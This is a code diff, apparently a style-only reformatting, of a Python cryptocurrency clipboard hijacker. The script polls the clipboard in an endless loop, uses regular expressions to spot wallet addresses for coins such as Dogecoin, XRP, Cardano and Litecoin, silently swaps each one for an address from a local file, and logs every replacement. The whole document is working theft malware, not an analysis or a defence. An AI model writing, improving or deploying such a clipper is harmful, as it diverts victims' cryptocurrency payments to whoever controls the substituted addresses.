@@ -17,32 +17,39 @@ parser = argparse.ArgumentParser(
 )
 parser.add_argument("--log", help="log output to log.json", action="store_true")
 
+
 def main():
     # infinite loop: always checking the clipboard
     print("Now watching clipboard for addresses... \n")
     while 1:
         now = datetime.now()
-        current_time = now.strftime("%d/%m/%Y %H:%M:%S") # for logging
+        current_time = now.strftime("%d/%m/%Y %H:%M:%S")  # for logging
 
-        time.sleep(0.5) # lets not hog up the cpu
+        time.sleep(0.5)  # lets not hog up the cpu
 
         user_clipboard = pyperclip.paste()
-        crypto_found = sniff(user_clipboard) # returns what potential cryptos are in clipboard
-        replacement_address = replace(user_clipboard,crypto_found) # do the replacement 
+        crypto_found = sniff(
+            user_clipboard
+        )  # returns what potential cryptos are in clipboard
+        replacement_address = replace(
+            user_clipboard, crypto_found
+        )  # do the replacement
 
         if replacement_address != 0:
-            log(now,crypto_found,user_clipboard,replacement_address) # only log if found
+            log(
+                now, crypto_found, user_clipboard, replacement_address
+            )  # only log if found
 
 
-def replace(user_clipboard,  crypto_found):
-    with open('addresses.json') as json_file: 
+def replace(user_clipboard, crypto_found):
+    with open("addresses.json") as json_file:
         master_addresses = json.load(json_file)
 
     if crypto_found != 0 and master_addresses[crypto_found] != "null":
-            pyperclip.copy(master_addresses[crypto_found])
-            return str(master_addresses[crypto_found])
+        pyperclip.copy(master_addresses[crypto_found])
+        return str(master_addresses[crypto_found])
     return 0
-       
+
 
 def sniff(user_clipboard):
     crypto_regex_match = {
@@ -53,7 +60,7 @@ def sniff(user_clipboard):
         "xrp": "^r[0-9a-zA-Z]{24,34}$",
         "doge": "^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$",
         "ada": "^D[A-NP-Za-km-z1-9]{35,}$",
-        "lite" : "^[LM3][a-km-zA-HJ-NP-Z1-9]{25,34}$",
+        "lite": "^[LM3][a-km-zA-HJ-NP-Z1-9]{25,34}$",
         "dot": "^[1-9A-HJ-NP-Za-km-z]*$",
     }
 
@@ -63,10 +70,23 @@ def sniff(user_clipboard):
 
     return 0
 
-def log(current_time,crypto_found,user_clipboard,replacement_address):
+
+def log(current_time, crypto_found, user_clipboard, replacement_address):
     if crypto_found != 0:
         with open("log.txt", "a+") as log:
-            log.write("[" + str(current_time) + "]: " + str(crypto_found.upper()) +  " in clipboard " + "(" + str(user_clipboard) + ") " + "replacing with -> "+ str(replacement_address) + "\n")
+            log.write(
+                "["
+                + str(current_time)
+                + "]: "
+                + str(crypto_found.upper())
+                + " in clipboard "
+                + "("
+                + str(user_clipboard)
+                + ") "
+                + "replacing with -> "
+                + str(replacement_address)
+                + "\n"
+            )
 
 
 main()
